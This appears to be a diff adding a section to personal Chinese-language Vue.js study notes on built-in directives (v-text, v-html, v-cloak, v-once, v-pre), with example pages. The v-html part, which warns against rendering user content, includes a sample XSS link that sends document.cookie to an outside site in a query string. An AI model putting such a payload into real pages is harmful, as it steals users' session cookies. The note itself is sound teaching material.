@@ -2922,3 +2922,242 @@ Vue监视数据的原理：
 ```
 
 <img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316183247382.png" alt="image-20230316183247382" style="zoom:50%;" />
+
+## 1.19 内置指令
+
+**v-text指令：**
+
+	1. 作用：向其所在的节点中渲染文本内容
+	1. 与差值语法的区别：v-text会替换掉节点的内容，{{xxx}}则不会
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-text指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div>{{name}}</div>
+        <div v-text="name"></div>
+        <div v-text="str"></div>
+    </div>
+    <script>
+        new Vue({
+            el: '#root',
+            data: {
+                name: 'czq',
+                str: '<h3>你好啊</h3>'
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+​	相比较下，插值语法的使用则灵活得多，因为一旦在标签中使用`v-text`，则标签体写什么已经没有了意义，而且也无法为我们解析模板
+
+![image-20230316184705525](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316184705525.png)
+
+**v-html指令：**
+
+	1. 作用：向指定节点中渲染包含html结构的内容
+ 	2. 与插值语法的区别：
+     	1. v-html会替换掉节点中所有的内容，{{xx}}则不会
+     	2. v-html可以识别html结构 
+
+3. 严重注意：v-html上有安全性问题！！！
+   1. 在网站上动态渲染人任意HTML是非常危险的，容易导致XSS攻击（因为用户提交的内容有可能就是一个恶意的a标签，点击可以获取你的所有cookie）
+   2. 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上
+
+补充：**关于Nodejs中的cookie：**
+
+之所以我们在某些网站登陆了一次之后不用重新登陆，是因为我们第一次登录之后，服务器会在让我们成功登录的同时，或多或少给我们返回一些cookie，以便我们下次在访问其他用户验证的内容时不用重新验证我们的身份。cookie的本质就是字符串对象，以key-value的形式存储在浏览器中，cookie是不可以跨浏览器的，但是一旦我们持有cookie的浏览器中的cookie信息被他人获取，则可以在其他浏览器用我们的cookie登录我们的账号。所以我们要妥善保管我们的cookie，以防他人盗用后登录我们的账号干坏事
+
+​	如用Chrome浏览器登录github所产生的cookie：
+
+<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193024778.png" alt="image-20230316193024778" style="zoom:50%;" />
+
+​	一旦心怀不轨的人获取到了这些cookie，就可以悄无声息的免密登录我们的账户
+
+​	cookie的大致原理如图所示：
+
+![image-20230316193336599](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193336599.png)
+
+![image-20230316193413894](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193413894.png)
+
+使用v-html解析并获取用户cookie的代码示例：
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-text指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div>{{name}}</div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+    </div>
+    <script>
+        new Vue({
+            el: '#root',
+            data: {
+                name: 'czq',
+                str: '<h3>你好啊</h3>',
+                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>获取cookie test</a>'
+            }
+        })
+    </script>
+</body>
+</html>
+
+```
+
+在str2这个属性中，如果服务器写的不完善，不会隐藏cookie时，我们使用了a标签并且传了参数，而且跳转的网址中使用js命令`document.cookie`获取了用户的cookie，这样子cookie就会直接显示在用户的地址栏中，随时有可能被心怀不轨的远端窃取。
+
+​	点击cookie test前：
+
+<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193925950.png" alt="image-20230316193925950" style="zoom:50%;" />
+
+点击后：
+
+<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193952934.png" alt="image-20230316193952934" style="zoom:50%;" />
+
+我们的cookie则会直接显示在地址栏中。
+
+所以必须注意使用这个v-html。
+
+**v-cloak指令（没有值）：**
+
+	1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉`v-cloak`属性
+	1. 使用css（display: none）配合`v-cloak`属性可以解决网速慢时页面展示出{{xxx}}的问题
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-cloak指令</title>
+    <script src="../js/vue.js"></script>
+    <style>
+        [v-cloak] {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="root">
+        <h2 v-cloak>{{name}}</h2>
+    </div>
+    <script>
+        setTimeout(() => {
+            new Vue({
+                el: '#root',
+                data: {
+                    name: 'czq',
+                }
+            })
+        }, 5000);
+    </script>
+</body>
+
+</html>
+```
+
+5s结束之前：
+
+![image-20230316200201025](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316200201025.png)
+
+5s结束之后：
+
+![image-20230316200245472](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316200245472.png)
+
+由此可见，页面上有{{name}}这个内容，只不过被display:none了 后来vue接管后，瞬间删除了v-cloak并重新解析了模板
+
+**v-once指令：**
+
+	1. v-once所在的节点在初次动态渲染后，就被视为静态内容了
+	1. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-once指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h2>当前的n值是：{{n}}</h2>
+        <h2 v-once>初始化的n值是：{{n}}</h2>
+        <button @click="n++">n + 1</button>
+    </div>
+
+    <script>
+        new Vue({
+            el: '#root',
+            data: {
+                n: 1
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+![image-20230316201348533](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316201348533.png)
+
+**v-pre指令：**
+
+	1. 跳过其所在节点的编译过程
+	1. 可以利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-pre指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h2 v-pre>Vue其实很简单</h2>
+        <h2 v-pre>当前的n值是：{{n}}</h2>
+        <button v-pre @click="n++">n + 1</button>
+    </div>
+
+    <script>
+        new Vue({
+            el: '#root',
+            data: {
+                n: 1
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+![image-20230316201859628](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316201859628.png)
+
+由此可见，加入了v-pre指令的标签将不会被Vue解析
